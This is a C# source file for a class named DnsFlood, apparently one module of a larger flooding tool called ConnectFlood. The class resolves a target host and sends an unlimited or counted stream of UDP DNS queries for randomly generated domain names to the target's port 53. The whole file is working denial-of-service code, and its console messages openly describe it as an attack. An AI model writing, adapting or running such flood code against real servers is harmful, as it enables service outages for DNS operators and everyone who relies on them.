using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ConnectFlood
{
    public class DnsFlood : IAttack
    {
        private Random random = new Random();

        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            if (target.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
                target = target.Substring(7);
            else if (target.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                target = target.Substring(8);
            if (target.Contains(":"))
                target = target.Split(':')[0];

            Console.WriteLine($"[DNS] Resolving {target}...");

            try
            {
                IPAddress[] addresses = Dns.GetHostAddresses(target);
                if (addresses.Length == 0)
                {
                    Console.WriteLine("[DNS] Failed to resolve domain.");
                    return;
                }
                target = addresses[0].ToString(); 
                Console.WriteLine($"[DNS] Resolved {target}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DNS] Resolution error: {ex.Message}");
                return;
            }

            Console.WriteLine($"[DNS] Attacking {target} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms");

            int sentPackets = 0;
            IPEndPoint dnsServer = new IPEndPoint(IPAddress.Parse(target), 53);

            while (packetCount == -1 || sentPackets < packetCount)
            {
                try
                {
                    using (UdpClient udpClient = new UdpClient())
                    {
                        byte[] dnsQuery = GenerateDnsQuery();
                        udpClient.Send(dnsQuery, dnsQuery.Length, dnsServer);
                    }

                    Console.WriteLine($"[DNS] Packet {sentPackets + 1} sent to {target}:53");

                    sentPackets++;
                    Thread.Sleep(speed);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[DNS] Error: {ex.Message}");
                }
            }
            Console.WriteLine("[DNS] Attack finished.");
        }

        private byte[] GenerateDnsQuery()
        {
            byte[] query = new byte[512];
            random.NextBytes(query);
            query[0] = 0xAA;
            query[1] = 0xAA;
            query[2] = 0x01;
            query[3] = 0x00;
            query[4] = 0x00;
            query[5] = 0x01;
            query[6] = 0x00;
            query[7] = 0x00;
            query[8] = 0x00;
            query[9] = 0x00;
            query[10] = 0x00;
            query[11] = 0x00;

            string domain = GenerateRandomDomain();
            byte[] domainBytes = EncodeDomainName(domain);

            int index = 12;
            Array.Copy(domainBytes, 0, query, index, domainBytes.Length);
            index += domainBytes.Length;

            query[index++] = 0x00;
            query[index++] = 0x00;
            query[index++] = 0x01;
            query[index++] = 0x00;
            query[index++] = 0x01;

            Array.Resize(ref query, index);

            return query;
        }

        private string GenerateRandomDomain()
        {
            string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            string[] extensions = { ".com", ".net", ".org", ".xyz", ".info", ".tech" };
            StringBuilder domain = new StringBuilder();

            for (int i = 0; i < random.Next(30, 35); i++)
            {
                domain.Append(chars[random.Next(chars.Length)]);
            }

            return domain.ToString() + extensions[random.Next(extensions.Length)];
        }


        private byte[] EncodeDomainName(string domain)
        {
            string[] labels = domain.Split('.');
            byte[] encoded = new byte[domain.Length + 2];
            int index = 0;

            foreach (string label in labels)
            {
                encoded[index++] = (byte)label.Length;
                Encoding.ASCII.GetBytes(label).CopyTo(encoded, index);
                index += label.Length;
            }
            encoded[index] = 0;
            Array.Resize(ref encoded, index + 1);
            return encoded;
        }
    }
}
